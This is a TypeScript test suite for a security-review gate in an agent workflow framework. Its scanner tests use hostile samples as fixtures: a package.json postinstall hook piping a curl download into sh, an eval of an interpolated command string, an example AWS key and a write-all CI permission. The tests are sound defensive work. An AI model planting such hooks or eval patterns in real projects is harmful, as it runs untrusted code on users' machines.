import { mkdir, mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { WorkflowState } from "@agent-workflow-kit/core";
import {
  applySecurityEvidence,
  applySecurityPolicy,
  bindSecurityReviewToRequest,
  deriveSecurityStatus,
  latestRecordedSecurityReview,
  mergeSecurityPolicyChecks,
  mergeSecurityReviewEvidence,
  SECURITY_PROTECTED_PATTERNS,
  staleSecurityReview,
  validateSecurityReviewEvidence,
  WORKSPACE_PROTECTED_PATTERNS,
  createWorkflowOrchestrator,
  type OrchestrationResult,
  type SecurityCheckEvidence,
  type SecurityReviewEvidence,
  type SecurityReviewProvider,
  type SecurityReviewRequest,
} from "@agent-workflow-kit/orchestration";
import { createFeatureSessionStore } from "@agent-workflow-kit/persistence";
import { createProjectSecurityReviewProvider } from "@agent-workflow-kit/project";
import { FakeStageExecutor } from "../fixtures/stage-executor.js";
import {
  createFakeWorkspaceProvider,
  type FakeWorkspaceProvider,
} from "../fixtures/workspace-provider.js";
import { createFakeVerificationProvider } from "../fixtures/verification-provider.js";
import { createFakeSecurityProvider, passingSecurityReviewFor } from "../fixtures/security-provider.js";
import { afterEach, describe, expect, it } from "vitest";

const fixedTimestamp = "2026-04-05T06:07:08.000Z";
const roots: string[] = [];

interface Harness {
  readonly store: ReturnType<typeof createFeatureSessionStore>;
  readonly executor: FakeStageExecutor;
  readonly security: SecurityReviewProvider & { readonly calls: readonly SecurityReviewRequest[] };
  readonly orchestrator: ReturnType<typeof createWorkflowOrchestrator>;
}

async function makeRoot(): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), "agent-workflow-kit-security-"));
  roots.push(root);
  return root;
}

/**
 * A security provider that answers verbatim and records every request.
 *
 * It patches nothing on the way out. A fixture that helpfully stamped the current revision onto its
 * answer could never present the framework with a record belonging to a different tree, and the stale
 * and mismatched cases are exactly the ones worth testing.
 */
class RecordingProvider implements SecurityReviewProvider {
  /** Every request, under the name the shared fixture uses, so both read the same array. */
  readonly calls: SecurityReviewRequest[] = [];
  readonly requests: SecurityReviewRequest[] = this.calls;
  readonly #answer: (request: SecurityReviewRequest) => SecurityReviewEvidence | Promise<SecurityReviewEvidence> | Error;

  constructor(
    answer: (request: SecurityReviewRequest) => SecurityReviewEvidence | Promise<SecurityReviewEvidence> | Error,
  ) {
    this.#answer = answer;
  }

  review(request: SecurityReviewRequest): Promise<SecurityReviewEvidence> {
    this.requests.push(request);

    const answer = this.#answer(request);

    if (answer instanceof Error) {
      return Promise.reject(answer);
    }

    return Promise.resolve(answer);
  }
}

function passingProvider(): RecordingProvider {
  return new RecordingProvider((request) => passingSecurityReviewFor(request));
}

/** A provider that fails one check and passes the rest. */
function failingProvider(
  check: SecurityReviewEvidence["checks"][number]["check"] = "hardcoded_secret",
  paths: readonly string[] = ["src/index.ts"],
  reason = "It contains an AWS access key id.",
): RecordingProvider {
  return new RecordingProvider((request) => {
    const base = passingSecurityReviewFor(request);
    // The failed entry replaces the passing one rather than joining it: two entries for one check
    // would be refused as ambiguous, which is correct and would make this fixture useless.
    const checks: SecurityCheckEvidence[] = [
      ...base.checks.filter((entry) => entry.check !== check),
      { check, result: "failed" as const, paths: [...paths], reason, authority: "provider" as const },
    ].sort((left, right) => left.check.localeCompare(right.check));

    return { ...base, status: deriveSecurityStatus(checks), checks };
  });
}

/** The change set the gate is asked to judge, unless a test replaces it. */
const APPROVED_SCOPE = ["docs/**", "src/**"];
const CHANGED_PATHS = ["docs/plan.md", "src/index.ts"];

function planningExecutor(): FakeStageExecutor {
  return new FakeStageExecutor().configure("planning", {
    artifacts: [
      {
        name: "plan",
        content: {
          steps: [{ description: "Write it.", expectedFiles: [...APPROVED_SCOPE] }],
        },
      },
    ],
  });
}

function workspaceFor(root: string): FakeWorkspaceProvider {
  return createFakeWorkspaceProvider({
    workingDirectory: join(root, "workspace"),
    // Untracked only: a real change set never lists one path as both added and untracked, and
    // `approvedPathsOf` counts categories rather than deduplicating across them.
    changes: { untracked: [...CHANGED_PATHS] },
  });
}

function makeHarness(
  root: string,
  security: SecurityReviewProvider | null,
  executor: FakeStageExecutor = planningExecutor(),
  workspace: FakeWorkspaceProvider = workspaceFor(root),
): Harness {
  const store = createFeatureSessionStore(root, { clock: () => fixedTimestamp });
  const withCalls = security ?? createFakeSecurityProvider();
  const orchestrator = createWorkflowOrchestrator({
    store,
    executor,
    workspace,
    verification: createFakeVerificationProvider(),
    security,
    projectRoot: root,
  });

  return { store, executor, security: withCalls as Harness["security"], orchestrator };
}

async function driveToPlanGate(harness: Harness): Promise<void> {
  await harness.orchestrator.createFeature({
    featureId: "F-001",
    title: "Deterministic security review",
    request: "# Request\n\nReview the change deterministically.\n",
  });

  for (let step = 0; step < 6; step += 1) {
    await harness.orchestrator.runNext("F-001");
  }

  await harness.orchestrator.approvePlan("F-001");
}

/** Runs every stage up to but not including the security review. */
async function driveToSecurityReview(harness: Harness): Promise<void> {
  await driveToPlanGate(harness);

  // implementation, code review, scope review, static, test, runtime.
  for (let step = 0; step < 6; step += 1) {
    await harness.orchestrator.runNext("F-001");
  }
}

function checkNamed(
  record: SecurityReviewEvidence,
  check: SecurityReviewEvidence["checks"][number]["check"],
): SecurityReviewEvidence["checks"][number] | undefined {
  return record.checks.find((entry) => entry.check === check);
}

afterEach(async () => {
  for (const root of roots.splice(0)) {
    await rm(root, { recursive: true, force: true });
  }
});

function oneCheck(record: SecurityReviewEvidence): SecurityCheckEvidence {
  const check = record.checks[0];

  if (check === undefined) {
    throw new Error("The fixture record carried no check to build from.");
  }

  return check;
}

function failedOn(record: SecurityReviewEvidence, path: string): SecurityCheckEvidence {
  return { ...oneCheck(record), result: "failed", paths: [path] };
}

describe("the framework-owned policy", () => {
  it("reuses the workspace protected patterns rather than keeping a second list", () => {
    expect(SECURITY_PROTECTED_PATTERNS).toEqual([...WORKSPACE_PROTECTED_PATTERNS]);
  });

  it("fails a protected configuration change the approved plan never described", () => {
    const applied = applySecurityPolicy({
      changes: {
        added: [],
        deleted: [],
        modified: [],
        renamed: [],
        untracked: [".opencode/agent.md"],
      },
      approvedPatterns: ["src/**"],
      protectedPatterns: SECURITY_PROTECTED_PATTERNS,
    });

    expect(applied).toHaveLength(2);
    expect(applied[0]).toMatchObject({
      check: "protected_configuration_changed",
      result: "failed",
      paths: [".opencode/agent.md"],
      authority: "framework",
    });
    expect(applied[0]?.reason).toContain(".opencode/agent.md");
  });

  it("reports a dependency configuration change the approved plan never described", () => {
    const applied = applySecurityPolicy({
      changes: {
        added: [],
        deleted: [],
        modified: [],
        renamed: [],
        untracked: ["package.json"],
      },
      approvedPatterns: ["src/**"],
      protectedPatterns: SECURITY_PROTECTED_PATTERNS,
    });

    expect(applied[1]).toMatchObject({
      check: "dependency_configuration_out_of_scope",
      result: "failed",
      paths: ["package.json"],
      authority: "framework",
    });
  });

  it("passes both checks when the plan already described the change", () => {
    const applied = applySecurityPolicy({
      changes: {
        added: [],
        deleted: [],
        modified: [],
        renamed: [],
        untracked: ["src/index.ts"],
      },
      approvedPatterns: ["src/**"],
      protectedPatterns: SECURITY_PROTECTED_PATTERNS,
    });

    expect(applied.every((check) => check.result === "passed")).toBe(true);
  });
});

describe("status derivation", () => {
  const passed = {
    check: "hardcoded_secret" as const,
    result: "passed" as const,
    paths: [],
    reason: "Nothing found.",
    authority: "provider" as const,
  };

  it("passes only when every check passed", () => {
    expect(deriveSecurityStatus([passed, passed])).toBe("pass");
  });

  it("fails when any check failed, whatever the rest say", () => {
    expect(
      deriveSecurityStatus([
        passed,
        passed,
        { ...passed, check: "shell_execution", result: "failed", paths: ["src/run.ts"] },
      ]),
    ).toBe("fail");
  });

  it("is inconclusive when nothing failed but something could not be measured", () => {
    expect(deriveSecurityStatus([passed, { ...passed, check: "shell_execution", result: "inconclusive" }])).toBe(
      "inconclusive",
    );
  });

  it("prefers a failure over an inconclusive result", () => {
    expect(
      deriveSecurityStatus([
        { ...passed, check: "shell_execution", result: "inconclusive" },
        { ...passed, check: "hardcoded_secret", result: "failed", paths: ["src/a.ts"] },
      ]),
    ).toBe("fail");
  });
});

describe("evidence validation", () => {
  const base: SecurityReviewEvidence = {
    schemaVersion: 1,
    featureId: "F-001",
    stage: "security_review",
    status: "pass",
    revision: 4,
    workspaceFingerprint: "0".repeat(64),
    projectRoot: "/repo",
    workspaceId: "ws-1",
    approvedPatterns: ["src/**"],
    changedPaths: ["src/a.ts"],
    checks: [
      { check: "hardcoded_secret", result: "passed", paths: [], reason: "Nothing found.", authority: "provider" },
    ],
    collectedAt: fixedTimestamp,
  };

  it("accepts a well-formed record", () => {
    expect(validateSecurityReviewEvidence(base)).toMatchObject({ ok: true });
  });

  it("refuses a status its own checks contradict", () => {
    const validated = validateSecurityReviewEvidence({
      ...base,
      status: "pass",
      checks: [failedOn(base, "src/a.ts")],
    });

    expect(validated).toMatchObject({ ok: false, code: "security_evidence_invalid" });
  });

  it("refuses a record that claims a framework check as its own", () => {
    const validated = validateSecurityReviewEvidence({
      ...base,
      checks: [
        {
          check: "protected_configuration_changed",
          result: "passed",
          paths: [],
          reason: "Nothing found.",
          authority: "provider",
        },
      ],
    });

    expect(validated).toMatchObject({ ok: false, code: "security_evidence_invalid" });
  });

  it("refuses a failed check that named no path", () => {
    const validated = validateSecurityReviewEvidence({
      ...base,
      status: "fail",
      checks: [{ ...oneCheck(base), result: "failed", paths: [] }],
    });

    expect(validated).toMatchObject({ ok: false, code: "security_evidence_invalid" });
  });

  it("refuses a passed check that named paths", () => {
    const validated = validateSecurityReviewEvidence({
      ...base,
      checks: [{ ...oneCheck(base), result: "passed", paths: ["src/a.ts"] }],
    });

    expect(validated).toMatchObject({ ok: false, code: "security_evidence_invalid" });
  });

  it("refuses two entries for one check, which would make the status ambiguous", () => {
    const validated = validateSecurityReviewEvidence({ ...base, checks: [oneCheck(base), oneCheck(base)] });

    expect(validated).toMatchObject({ ok: false, code: "security_evidence_invalid" });
  });

  it("refuses a record for a stage other than the security review", () => {
    expect(validateSecurityReviewEvidence({ ...base, stage: "static_verification" })).toMatchObject({
      ok: false,
      code: "security_evidence_invalid",
    });
  });

  it("refuses something that is not a record at all", () => {
    expect(validateSecurityReviewEvidence(null)).toMatchObject({ ok: false, code: "security_evidence_invalid" });
    expect(validateSecurityReviewEvidence({})).toMatchObject({ ok: false, code: "security_evidence_invalid" });
  });
});

describe("binding a record to the request that asked for it", () => {
  const request: SecurityReviewRequest = {
    featureId: "F-001",
    stage: "security_review",
    revision: 4,
    projectRoot: "/repo",
    workspaceId: "ws-1",
    changes: {
      added: ["src/a.ts"],
      deleted: [],
      modified: [],
      renamed: [],
      untracked: [],
    },
    changedPaths: ["src/a.ts"],
    approvedPatterns: ["src/**"],
    protectedPatterns: SECURITY_PROTECTED_PATTERNS,
    workspaceFingerprint: "0".repeat(64),
    previousReview: null,
  };
  const record = passingSecurityReviewFor(request);

  it("accepts the record built for that request", () => {
    expect(bindSecurityReviewToRequest(record, request)).toMatchObject({ ok: true });
  });

  it("refuses a record for a different tree fingerprint", () => {
    const bound = bindSecurityReviewToRequest({ ...record, workspaceFingerprint: "1".repeat(64) }, request);

    expect(bound).toMatchObject({ ok: false, code: "security_evidence_mismatch" });
  });

  it("refuses a record collected at another revision", () => {
    expect(bindSecurityReviewToRequest({ ...record, revision: 3 }, request)).toMatchObject({
      ok: false,
      code: "security_evidence_mismatch",
    });
  });

  it("refuses a record describing a different path set", () => {
    expect(bindSecurityReviewToRequest({ ...record, changedPaths: ["src/b.ts"] }, request)).toMatchObject({
      ok: false,
      code: "security_evidence_mismatch",
    });
  });

  it("refuses a record measured against another workspace", () => {
    expect(bindSecurityReviewToRequest({ ...record, workspaceId: "ws-2" }, request)).toMatchObject({
      ok: false,
      code: "security_evidence_mismatch",
    });
  });
});

describe("freshness after a fix", () => {
  const record: SecurityReviewEvidence = {
    schemaVersion: 1,
    featureId: "F-001",
    stage: "security_review",
    status: "fail",
    revision: 5,
    workspaceFingerprint: "0".repeat(64),
    projectRoot: "/repo",
    workspaceId: "ws-1",
    approvedPatterns: [],
    changedPaths: ["src/a.ts"],
    checks: [
      { check: "hardcoded_secret", result: "failed", paths: ["src/a.ts"], reason: "A key.", authority: "provider" },
    ],
    collectedAt: fixedTimestamp,
  };

  it("refuses a record collected before the last recorded fix", () => {
    const stale = staleSecurityReview(record, { recordedAt: "2026-04-06T00:00:00.000Z", revisionBefore: 4 });

    expect(stale).toMatchObject({ code: "stale_security_evidence" });
  });

  it("refuses a record at or below the revision the fix started from", () => {
    expect(staleSecurityReview(record, { recordedAt: "2026-04-05T00:00:00.000Z", revisionBefore: 5 })).toMatchObject({
      code: "stale_security_evidence",
    });
  });

  it("accepts a record collected after the fix, at a newer revision", () => {
    expect(
      staleSecurityReview(
        { ...record, revision: 6, collectedAt: "2026-04-06T00:00:00.000Z" },
        { recordedAt: fixedTimestamp, revisionBefore: 4 },
      ),
    ).toBeNull();
  });
});

describe("applying a record to a stage outcome", () => {
  const failing: SecurityReviewEvidence = {
    schemaVersion: 1,
    featureId: "F-001",
    stage: "security_review",
    status: "fail",
    revision: 1,
    workspaceFingerprint: "0".repeat(64),
    projectRoot: "/repo",
    workspaceId: "ws-1",
    approvedPatterns: [],
    changedPaths: ["src/a.ts"],
    checks: [
      { check: "hardcoded_secret", result: "failed", paths: ["src/a.ts"], reason: "A key.", authority: "provider" },
    ],
    collectedAt: fixedTimestamp,
  };

  it("overrules a reviewer who reported success about a failed check", () => {
    const applied = applySecurityEvidence(failing, "success", "F-001");

    expect(applied).toMatchObject({ outcome: "needs_fix", override: "security_failure" });
    expect(applied.findings.length).toBeGreaterThan(0);
  });

  it("does not downgrade a reviewer's own failure to a success", () => {
    expect(applySecurityEvidence(failing, "failed", "F-001").outcome).toBe("failed");
  });

  it("reports a failing record without changing an outcome that was already not a success", () => {
    expect(applySecurityEvidence(failing, "needs_fix", "F-001").override).toBe("none");
  });

  it("leaves a reviewer's own failure at failed rather than routing it to the fixer", () => {
    // A reviewer that failed the stage on its own reading has not said "a fix would fix this".
    expect(applySecurityEvidence(failing, "failed", "F-001")).toMatchObject({
      outcome: "failed",
      override: "none",
    });
  });
});

describe("merging attempts under the framework-owned key", () => {
  const record: SecurityReviewEvidence = {
    schemaVersion: 1,
    featureId: "F-001",
    stage: "security_review",
    status: "pass",
    revision: 1,
    workspaceFingerprint: "0".repeat(64),
    projectRoot: "/repo",
    workspaceId: "ws-1",
    approvedPatterns: [],
    changedPaths: [],
    checks: [
      { check: "hardcoded_secret", result: "passed", paths: [], reason: "Nothing found.", authority: "provider" },
    ],
    collectedAt: fixedTimestamp,
  };

  it("writes into the framework key rather than the stage's own section", () => {
    const merged = mergeSecurityReviewEvidence({ summary: "The model wrote this." }, record) as Record<
      string,
      Record<string, unknown>
    >;

    expect(merged["summary"]).toBe("The model wrote this.");
    expect(merged["deterministic_evidence"]).toHaveProperty("security_review");
  });

  it("keeps every attempt rather than overwriting the last", () => {
    const once = mergeSecurityReviewEvidence({}, record);
    const twice = mergeSecurityReviewEvidence(once, { ...record, revision: 2 }) as {
      readonly deterministic_evidence: { readonly security_review: readonly unknown[] };
    };

    expect(twice.deterministic_evidence.security_review).toHaveLength(2);
  });

  it("reads back the newest attempt", () => {
    const once = mergeSecurityReviewEvidence({}, record);
    const twice = mergeSecurityReviewEvidence(once, { ...record, revision: 9 });

    expect(latestRecordedSecurityReview(twice)?.revision).toBe(9);
  });

  it("returns null for an artifact that was never written", () => {
    expect(latestRecordedSecurityReview({ summary: "nothing here" })).toBeNull();
  });
});

describe("the framework policy survives a provider that answers for it", () => {
  it("replaces a provider's claim about a framework check with the measured one", () => {
    const record: SecurityReviewEvidence = {
      schemaVersion: 1,
      featureId: "F-001",
      stage: "security_review",
      status: "pass",
      revision: 1,
      workspaceFingerprint: "0".repeat(64),
      projectRoot: "/repo",
      workspaceId: "ws-1",
      approvedPatterns: ["src/**"],
      changedPaths: [".opencode/agent.md", "src/a.ts"],
      checks: [
        { check: "hardcoded_secret", result: "passed", paths: [], reason: "Nothing found.", authority: "provider" },
      ],
      collectedAt: fixedTimestamp,
    };
    const merged = mergeSecurityPolicyChecks(
      record,
      applySecurityPolicy({
        changes: {
          added: [],
          deleted: [],
          modified: [],
          renamed: [],
          untracked: [".opencode/agent.md", "src/a.ts"],
        },
        approvedPatterns: ["src/**"],
        protectedPatterns: SECURITY_PROTECTED_PATTERNS,
      }),
    );

    // The provider declared every one of its checks passed, and said nothing about protected paths.
    expect(record.status).toBe("pass");
    expect(checkNamed(merged, "protected_configuration_changed")).toMatchObject({
      result: "failed",
      authority: "framework",
    });
    expect(merged.status).toBe("fail");
  });
});

describe("the gate in the workflow", () => {
  it("refuses the stage when no provider is configured, without invoking the reviewer", async () => {
    const root = await makeRoot();
    const harness = makeHarness(root, null);
    await driveToSecurityReview(harness);

    const result = await harness.orchestrator.runNext("F-001");

    expect(result).toMatchObject({
      status: "rejected",
      stage: "security_review",
      committed: false,
      error: { code: "security_not_configured", failureClass: "security" },
    });
    // Nothing was executed for this stage, so nothing could have described a scan.
    expect(harness.executor.calls.some((call) => call.stage === "security_review")).toBe(false);
  });

  it("collects a record only for the security review", async () => {
    const root = await makeRoot();
    const security = passingProvider();
    const harness = makeHarness(root, security);
    await driveToSecurityReview(harness);

    expect(security.requests).toEqual([]);

    await harness.orchestrator.runNext("F-001");

    expect(security.requests.map((request) => request.stage)).toEqual(["security_review"]);
  });

  it("hands the reviewer the change set, the approved scope, and the fingerprint to judge", async () => {
    const root = await makeRoot();
    const security = passingProvider();
    const harness = makeHarness(root, security);
    await driveToSecurityReview(harness);

    await harness.orchestrator.runNext("F-001");

    const request = security.requests[0] as SecurityReviewRequest;

    expect(request).toMatchObject({
      featureId: "F-001",
      stage: "security_review",
      approvedPatterns: APPROVED_SCOPE,
      protectedPatterns: [...SECURITY_PROTECTED_PATTERNS],
    });
    expect(request.workspaceFingerprint).toMatch(/^[0-9a-f]{64}$/u);
    expect(request.changedPaths).toEqual([...CHANGED_PATHS].sort());
  });

  it("completes the stage and moves to the final gate on a passing record", async () => {
    const root = await makeRoot();
    const harness = makeHarness(root, passingProvider());
    await driveToSecurityReview(harness);

    const result = await harness.orchestrator.runNext("F-001");

    expect(result).toMatchObject({
      status: "stage_completed",
      stage: "security_review",
      role: "security_reviewer",
      state: WorkflowState.FinalGate,
      committed: true,
    });
    expect(result.security).toMatchObject({ status: "pass", featureId: "F-001" });
  });

  it("overrules a reviewer who reported success about a failed check, and routes it to the fixer", async () => {
    const root = await makeRoot();
    const harness = makeHarness(root, failingProvider());
    await driveToSecurityReview(harness);

    // The executor is left reporting success, which is the case worth overruling.
    const result = await harness.orchestrator.runNext("F-001");

    expect(result).toMatchObject({
      status: "fix_requested",
      stage: "security_review",
      state: WorkflowState.Fixing,
      event: "request_fix",
      fixReturnState: WorkflowState.SecurityReview,
    });
    expect(result.findings.some((finding) => finding.message.includes("src/index.ts"))).toBe(true);
  });

  it("records the failed record in the security review artifact", async () => {
    const root = await makeRoot();
    const harness = makeHarness(root, failingProvider());
    await driveToSecurityReview(harness);

    await harness.orchestrator.runNext("F-001");

    const artifact = await harness.store.readArtifact("F-001", "security_review");

    expect(latestRecordedSecurityReview(artifact)).toMatchObject({ status: "fail" });
  });

  it("refuses the stage when the provider throws", async () => {
    const root = await makeRoot();
    const harness = makeHarness(root, new RecordingProvider(() => new Error("the scanner crashed")));
    await driveToSecurityReview(harness);

    expect(await harness.orchestrator.runNext("F-001")).toMatchObject({
      status: "rejected",
      error: { code: "security_provider_failed", failureClass: "security" },
    });
  });

  it("refuses a record the framework cannot verify", async () => {
    const root = await makeRoot();
    const harness = makeHarness(
      root,
      new RecordingProvider((request) => ({ ...passingSecurityReviewFor(request), status: "fail" })),
    );
    await driveToSecurityReview(harness);

    expect(await harness.orchestrator.runNext("F-001")).toMatchObject({
      status: "rejected",
      error: { code: "security_evidence_invalid" },
    });
  });

  it("refuses a record measured against another tree", async () => {
    const root = await makeRoot();
    const harness = makeHarness(
      root,
      new RecordingProvider((request) => ({
        ...passingSecurityReviewFor(request),
        workspaceFingerprint: "9".repeat(64),
      })),
    );
    await driveToSecurityReview(harness);

    expect(await harness.orchestrator.runNext("F-001")).toMatchObject({
      status: "rejected",
      error: { code: "security_evidence_mismatch" },
    });
  });

  it("fails a protected configuration change even when the provider declared its checks passed", async () => {
    const root = await makeRoot();
    const workspace = createFakeWorkspaceProvider({
      workingDirectory: join(root, "workspace"),
      changes: { added: [".opencode/agent.md"], untracked: [".opencode/agent.md"] },
    });
    const harness = makeHarness(root, passingProvider(), planningExecutor(), workspace);
    await driveToSecurityReview(harness);

    const result = await harness.orchestrator.runNext("F-001");

    expect(result.status).not.toBe("stage_completed");
    expect(result.security).toBeNull();
    // The scope refusal is the one that wins, because it happens before the record is applied.
    expect(result.error?.message).toContain(".opencode/agent.md");
  });

  it("refuses a cached record that names the revision it was collected at", async () => {
    const root = await makeRoot();
    // A provider that answers with the record it built the first time it was asked, verbatim. The
    // revision it names is no longer the one under review, so it is caught before anything else runs.
    const failing = failingProvider();
    let cached: SecurityReviewEvidence | null = null;
    const harness = makeHarness(
      root,
      new RecordingProvider((request) =>
        failing.review(request).then((record) => {
          cached ??= record;
          return cached;
        }),
      ),
    );
    await driveToSecurityReview(harness);

    expect(await harness.orchestrator.runNext("F-001")).toMatchObject({ status: "fix_requested" });
    expect(await harness.orchestrator.runNext("F-001")).toMatchObject({
      status: "stage_completed",
      stage: "fixing",
      state: WorkflowState.SecurityReview,
    });

    expect(await harness.orchestrator.runNext("F-001")).toMatchObject({
      status: "rejected",
      committed: false,
      error: { code: "security_evidence_mismatch", failureClass: "security" },
    });
  });

  it("refuses a record collected before the last fix, however current its revision looks", async () => {
    const root = await makeRoot();
    // The harder case: a provider that restamps the record with the revision it was asked about, so
    // every binding check passes, while the scan behind it is the pre-fix one. Only a comparison
    // against the fix history catches this, which is why the freshness check is not the same check.
    const failing = failingProvider();
    const harness = makeHarness(
      root,
      new RecordingProvider(async (request) => ({
        ...(await failing.review(request)),
        collectedAt: "2026-04-05T06:07:07.000Z",
      })),
    );
    await driveToSecurityReview(harness);

    // The first attempt predates nothing, so it is collected normally.
    expect(await harness.orchestrator.runNext("F-001")).toMatchObject({ status: "fix_requested" });
    expect(await harness.orchestrator.runNext("F-001")).toMatchObject({
      status: "stage_completed",
      stage: "fixing",
      state: WorkflowState.SecurityReview,
    });

    expect(await harness.orchestrator.runNext("F-001")).toMatchObject({
      status: "rejected",
      committed: false,
      error: { code: "stale_security_evidence", failureClass: "security" },
    });
  });

  it("returns the feature to the security review after an accepted fix, and rescans the new tree", async () => {
    const root = await makeRoot();
    const harness = makeHarness(root, failingProvider());
    await driveToSecurityReview(harness);

    expect(await harness.orchestrator.runNext("F-001")).toMatchObject({ status: "fix_requested" });
    expect(await harness.orchestrator.runNext("F-001")).toMatchObject({
      status: "stage_completed",
      stage: "fixing",
      state: WorkflowState.SecurityReview,
    });

    const rechecked = await harness.orchestrator.runNext("F-001");

    // The scan ran again, against the revision the fix produced rather than the one it repaired.
    expect(harness.security.calls).toHaveLength(2);
    expect(harness.security.calls[1]?.revision).toBeGreaterThan(harness.security.calls[0]?.revision ?? 0);
    // It failed again, because this provider fails every time: the loop is the point, not the outcome.
    expect(rechecked).toMatchObject({ status: "fix_requested", fixReturnState: WorkflowState.SecurityReview });
  });

  it("hands the fixer the failed record, not a description of it", async () => {
    const root = await makeRoot();
    const harness = makeHarness(root, failingProvider());
    await driveToSecurityReview(harness);

    await harness.orchestrator.runNext("F-001");
    await harness.orchestrator.runNext("F-001");

    const fixCall = harness.executor.calls.find((call) => call.stage === "fixing");
    const contract = fixCall?.fix;

    expect(contract?.securityEvidence).toMatchObject({ status: "fail" });
    expect(contract?.deterministicEvidence).toBeNull();
    expect(contract?.suspectedFiles).toEqual(["src/index.ts"]);
    expect(contract?.failureReason).toContain("hardcoded_secret");
  });
});

describe("the project scanner against a real tree", () => {
  async function scan(files: Readonly<Record<string, string>>): Promise<SecurityReviewEvidence> {
    const root = await makeRoot();

    for (const [path, contents] of Object.entries(files)) {
      const absolute = join(root, path);
      await mkdir(join(absolute, ".."), { recursive: true });
      await writeFile(absolute, contents, "utf8");
    }

    const provider = createProjectSecurityReviewProvider({ projectRoot: root });
    const changedPaths = Object.keys(files).sort();

    return provider.review({
      featureId: "F-001",
      stage: "security_review",
      revision: 1,
      projectRoot: root,
      workspaceId: "ws-1",
      changes: {
        added: changedPaths,
        deleted: [],
        modified: [],
        renamed: [],
        untracked: [],
      },
      changedPaths,
      approvedPatterns: ["**"],
      protectedPatterns: SECURITY_PROTECTED_PATTERNS,
      workspaceFingerprint: "0".repeat(64),
      previousReview: null,
    });
  }

  it("passes an ordinary source file", async () => {
    const record = await scan({ "src/index.ts": "export const answer = 42;\n" });

    expect(record.status).toBe("pass");
  });

  it("finds a hardcoded secret in an added file", async () => {
    const record = await scan({
      "src/config.ts": 'export const key = "AKIAIOSFODNN7EXAMPLE";\n',
    });

    expect(checkNamed(record, "hardcoded_secret")).toMatchObject({ result: "failed", paths: ["src/config.ts"] });
    expect(record.status).toBe("fail");
  });

  it("does not report a credential that is plainly a placeholder", async () => {
    const record = await scan({
      "src/config.ts": 'export const key = "YOUR_API_KEY_HERE";\nexport const other = process.env.API_KEY;\n',
    });

    expect(checkNamed(record, "hardcoded_secret")).toMatchObject({ result: "passed" });
  });

  it("finds a committed credential file outside the approved scope", async () => {
    const record = await scan({ ".env": "API_KEY=x\n" });

    expect(checkNamed(record, "credential_file")).toMatchObject({ result: "failed", paths: [".env"] });
  });

  it("finds a shell command executing a string", async () => {
    const record = await scan({ "src/run.ts": 'export const run = (cmd) => eval(`"${cmd}"`);\n' });

    expect(checkNamed(record, "shell_execution")).toMatchObject({ result: "failed", paths: ["src/run.ts"] });
  });

  it("finds a lifecycle hook that pipes a download into a shell", async () => {
    const record = await scan({
      "package.json": JSON.stringify({
        name: "fixture",
        scripts: { postinstall: "curl https://example.com/i.sh | sh" },
      }),
    });

    expect(checkNamed(record, "package_manager_hook")).toMatchObject({ result: "failed", paths: ["package.json"] });
  });

  it("finds a workflow permission that grants write to everything", async () => {
    const record = await scan({
      ".github/workflows/ci.yml": "on: push\npermissions: write-all\njobs:\n  build:\n    runs-on: ubuntu-latest\n",
    });

    expect(checkNamed(record, "permission_broadening")).toMatchObject({ result: "failed" });
  });

  it("does not treat a deleted path as an unreadable one", async () => {
    const root = await makeRoot();
    const provider = createProjectSecurityReviewProvider({ projectRoot: root });

    // The change set names a path that is no longer on disk, which is a deletion and not a gap.
    const record = await provider.review({
      featureId: "F-001",
      stage: "security_review",
      revision: 1,
      projectRoot: root,
      workspaceId: "ws-1",
      changes: { added: [], deleted: ["src/gone.ts"], modified: [], renamed: [], untracked: ["src/gone.ts"] },
      changedPaths: ["src/gone.ts"],
      approvedPatterns: ["**"],
      protectedPatterns: SECURITY_PROTECTED_PATTERNS,
      workspaceFingerprint: "0".repeat(64),
      previousReview: null,
    });

    expect(record.status).toBe("pass");
  });

  it("is inconclusive rather than silent when a changed path cannot be read", async () => {
    const root = await makeRoot();
    const outside = await makeRoot();
    await mkdir(join(root, "src"), { recursive: true });
    await writeFile(join(outside, "secret.txt"), "AKIAIOSFODNN7EXAMPLE\n", "utf8");
    await symlink(join(outside, "secret.txt"), join(root, "src", "link.ts"));
    const provider = createProjectSecurityReviewProvider({ projectRoot: root });

    const record = await provider.review({
      featureId: "F-001",
      stage: "security_review",
      revision: 1,
      projectRoot: root,
      workspaceId: "ws-1",
      changes: { added: ["src/link.ts"], deleted: [], modified: [], renamed: [], untracked: ["src/link.ts"] },
      changedPaths: ["src/link.ts"],
      approvedPatterns: ["**"],
      protectedPatterns: SECURITY_PROTECTED_PATTERNS,
      workspaceFingerprint: "0".repeat(64),
      previousReview: null,
    });

    // The link's target is outside the project, so what is behind it was not scanned and the record
    // says so rather than reporting a clean pass it did not earn.
    expect(record.status).toBe("inconclusive");
    expect(record.checks.some((check) => check.result === "inconclusive")).toBe(true);
  });

  it("refuses a request for a different project root", async () => {
    const root = await makeRoot();
    const provider = createProjectSecurityReviewProvider({ projectRoot: join(root, "elsewhere") });

    await expect(
      provider.review({
        featureId: "F-001",
        stage: "security_review",
        revision: 1,
        projectRoot: root,
        workspaceId: "ws-1",
        changes: { added: [], deleted: [], modified: [], renamed: [], untracked: [] },
        changedPaths: [],
        approvedPatterns: [],
        protectedPatterns: SECURITY_PROTECTED_PATTERNS,
        workspaceFingerprint: "0".repeat(64),
        previousReview: null,
      }),
    ).rejects.toThrow();
  });

  it("scans the tree a resolver names, the way a worktree stage is served", async () => {
    const project = await makeRoot();
    const worktree = await makeRoot();
    await mkdir(join(worktree, "src"), { recursive: true });
    await writeFile(join(worktree, "src", "config.ts"), 'export const key = "AKIAIOSFODNN7EXAMPLE";\n', "utf8");

    // A post-approval stage runs in the worktree the orchestrator opened, so one provider serves
    // both trees: the resolver says which tree this request belongs to, and the provider scans only
    // that. This is the same option the verification provider takes as `resolveRunRoot`.
    const provider = createProjectSecurityReviewProvider({
      projectRoot: project,
      resolveRoot: () => worktree,
    });
    const request: SecurityReviewRequest = {
      featureId: "F-001",
      stage: "security_review",
      revision: 1,
      projectRoot: worktree,
      workspaceId: "ws-1",
      changes: { added: ["src/config.ts"], deleted: [], modified: [], renamed: [], untracked: [] },
      changedPaths: ["src/config.ts"],
      approvedPatterns: ["**"],
      protectedPatterns: SECURITY_PROTECTED_PATTERNS,
      workspaceFingerprint: "0".repeat(64),
      previousReview: null,
    };

    const record = await provider.review(request);

    // The secret is in the worktree, and the record names the worktree as the tree that was read.
